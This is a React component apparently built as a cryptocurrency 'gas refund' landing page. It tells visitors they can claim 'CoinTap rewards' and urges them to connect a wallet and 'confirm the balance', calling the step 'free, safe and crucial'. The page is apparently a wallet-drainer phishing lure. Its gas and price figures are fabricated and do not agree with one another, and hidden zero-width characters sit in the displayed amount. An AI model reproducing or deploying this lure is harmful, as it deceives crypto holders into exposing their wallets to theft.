import { useState } from 'react';

function Example() {
  const [open, setOpen] = useState(false);
  const [accountConnected, setAccountConnected] = useState(false);

  return (
    <div className="mx-auto max-w-7xl py-8 sm:px-6 sm:py-8 lg:px-8">
      <div className="relative isolate overflow-hidden bg-gray-900 px-6 shadow-2xl sm:rounded-3xl sm:px-16 md:pt-8 lg:flex lg:gap-x-20 lg:px-24">
        <svg
          viewBox="0 0 1024 1024"
          className="absolute left-1/2 top-1/2 -z-10 h-[64rem] w-[64rem] -translate-y-1/2 [mask-image:radial-gradient(closest-side,white,transparent)] sm:left-full sm:-ml-80 lg:left-1/2 lg:ml-0 lg:-translate-x-1/2 lg:translate-y-0"
          aria-hidden="true"
        >
          <circle
            cx={512}
            cy={512}
            r={512}
            fill="url(#759c1415-0410-454c-8f7c-9a820de03641)"
            fillOpacity="0.7"
          />
          <defs>
            <radialGradient id="759c1415-0410-454c-8f7c-9a820de03641">
              <stop stopColor="#7775D6" />
              <stop offset={1} stopColor="#E935C1" />
            </radialGradient>
          </defs>
        </svg>

        <div className="mx-auto max-w-md text-center flex flex-col py-8 justify-center items-center">
          <h2 className="text-2xl font-bold tracking-tight text-white sm:text-4xl">
            <span className="text-sm font-normal text-gray-200">
              No account connected, using{' '}
              <span className="text-blue-400">0x2C8-5057D</span> as an example.
            </span>
            <br />
            You&apos;ve spent Ξ25.524​​​ on gas. Right now, that&apos;s $64,703.
          </h2>
          <p className="mt-4 text-lg leading-8 text-gray-300">
            You used 17,409,849 gas to send 539 transactions, with an average
            price of 26.48309M Gwei.
          </p>
          <p className="mt-4 text-lg leading-8 text-gray-300">
            You can claim 12,294 worth of CoinTap rewards
          </p>
          {/* <div
            onClick={() => {
              setOpen(false);
              setAccountConnected(false);
            }}
            className={`${accountConnected ? 'Home_highlightSelected__sCqsL' : 'Home_highlight__TZ0SE'} mt-6`}
          >
            <w3m-button />
          </div> */}
          <p className="mt-4 text-sm text-gray-400">
            NOTE: Please confirm the balance in your account after connecting
            your wallet to proceed with the transaction. This step is free, safe
            and crucial for verifying that your balance is sufficient to cover
            the transaction, allowing the Ethereum blockchain to process the
            refund of gas fees accurately. Ensuring your balance is confirmed
            will help avoid delays and ensure smooth processing of your
            transaction on the blockchain.
          </p>
        </div>
      </div>
    </div>
  );
}

export default Example;
